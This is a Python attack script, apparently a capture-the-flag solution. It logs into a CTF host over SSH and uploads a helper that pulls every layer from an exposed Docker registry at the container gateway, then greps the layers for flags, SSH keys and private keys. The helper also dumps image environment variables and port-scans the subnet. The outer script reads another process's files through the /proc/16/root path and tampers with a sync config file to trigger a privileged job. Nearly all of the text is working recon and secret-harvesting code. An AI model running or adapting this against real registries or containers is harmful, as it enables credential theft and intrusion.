#!/usr/bin/env python3
import paramiko, time, textwrap

HOST, PORT, USER, PW = "instance.ctf.tdho.st", 33039, "player", "reyalp"
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PW, timeout=12)

def cmd(c, t=25):
    i, o, e = ssh.exec_command(c, timeout=t)
    return (o.read() + e.read()).decode(errors="replace")

PY = textwrap.dedent(r'''
import urllib.request, json, gzip, tarfile, io, socket, struct

def gw():
    with open("/proc/net/route") as f:
        next(f)
        for line in f:
            p = line.strip().split()
            if p[1] == "00000000":
                return socket.inet_ntoa(struct.pack("<L", int(p[2], 16)))
    return "172.17.0.1"

def fetch(url, headers=None, timeout=8):
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

reg = "http://" + gw() + ":5000"
repos = json.loads(fetch(reg + "/v2/_catalog").decode())["repositories"]
print("REG", reg, repos)

def layers(repo, tag):
    for accept in [
        "application/vnd.docker.distribution.manifest.v2+json",
        "application/vnd.oci.image.manifest.v1+json",
    ]:
        try:
            req = urllib.request.Request(
                f"{reg}/v2/{repo}/manifests/{tag}",
                headers={"Accept": accept},
            )
            return json.loads(fetch(req.get_full_url(), headers=dict(req.header_items())))
        except Exception as e:
            err = str(e)
    raise RuntimeError(f"manifest fail {repo}:{tag} {err}")

def scan_tar(data, img, path_hint=""):
    opened = []
    for raw in [data]:
        try:
            opened.append(tarfile.open(fileobj=io.BytesIO(raw), mode="r:*"))
        except Exception:
            pass
    if data[:2] == b"\x1f\x8b":
        try:
            opened.append(tarfile.open(fileobj=io.BytesIO(gzip.decompress(data)), mode="r:*"))
        except Exception:
            pass
    for tf in opened:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            n = m.name
            body = tf.extractfile(m).read()
            interesting = (
                "sync" in n or "watch" in n or "flag" in n
                or b"tdho{" in body or b"Kaal{" in body
                or b"id_rsa" in body or b"BEGIN" in body and b"KEY" in body
            )
            if interesting:
                print(f"\n===== {img} :: {n} ({len(body)}b) =====")
                print(body.decode(errors="replace")[:20000])

for repo in repos:
    try:
        tags = json.loads(fetch(f"{reg}/v2/{repo}/tags/list").decode()).get("tags") or []
    except Exception as e:
        print("tags err", repo, e)
        continue
    print("TAGS", repo, tags)
    for tag in tags:
        img = f"{repo}:{tag}"
        try:
            m = layers(repo, tag)
        except Exception as e:
            print("skip", img, e)
            continue
        for layer in m.get("layers", []):
            try:
                data = fetch(f"{reg}/v2/{repo}/blobs/{layer['digest']}", timeout=20)
            except Exception as e:
                print("blob err", layer["digest"][:20], e)
                continue
            scan_tar(data, img)
        if "config" in m:
            try:
                cfg = json.loads(fetch(f"{reg}/v2/{repo}/blobs/{m['config']['digest']}").decode())
                env = cfg.get("config", {}).get("Env", [])
                if env:
                    print("\nENV", img, env)
                labels = cfg.get("config", {}).get("Labels", {})
                if labels:
                    print("LABELS", img, labels)
            except Exception:
                pass

# network scan for other containers
import concurrent.futures
subnet = ".".join(gw().split(".")[:3])
print("\nSCAN", subnet + ".0/24")
alive = []
for last in range(1, 20):
    ip = f"{subnet}.{last}"
    s = socket.socket()
    s.settimeout(0.3)
    code = s.connect_ex((ip, 22))
    s.close()
    if code == 0:
        alive.append((ip, 22))
    for port in [80, 8080, 5000, 25565]:
        s = socket.socket()
        s.settimeout(0.2)
        c = s.connect_ex((ip, port))
        s.close()
        if c == 0:
            alive.append((ip, port))
print("OPEN", alive)
''')

sftp = ssh.open_sftp()
with sftp.open("/tmp/grab.py", "w") as f:
    f.write(PY)
sftp.close()

print(cmd("python3 /tmp/grab.py", 120))

# Try reading sync-loop via proc root trick
print("=== READ SYNC-LOOP ===")
print(cmd("python3 -c \"import os; p='/proc/16/root/opt/mc/scripts/sync-loop.sh'; print(open(p).read() if os.path.exists(p) else 'no access')\""))

# Trigger sync and wait for sync-result.conf
print("=== TRIGGER SYNC ===")
for payload in ["talldwarf-sync-force=true", "talldwarf-sync=true"]:
    cmd(f'echo "{payload}" > /opt/mc/config/sync-request.conf')
    for wait in [5, 10, 15, 20]:
        time.sleep(5)
        r = cmd("ls -la /opt/mc/config/; cat /opt/mc/config/sync-result.conf 2>&1; cat /opt/mc/config/sync-request.conf")
        print(f"after {wait}s {payload}:")
        print(r)
        if "tdho{" in r or "FLAG=" in r:
            break

# Check .sync via root proc
print("=== SYNC RESULT VIA PROC ===")
print(cmd("python3 -c \"import os; p='/proc/16/root/opt/mc/.sync/sync.result'; print(open(p).read() if os.path.exists(p) else os.listdir('/proc/16/root/opt/mc/.sync') if os.path.isdir('/proc/16/root/opt/mc/.sync') else 'none')\""))

ssh.close()
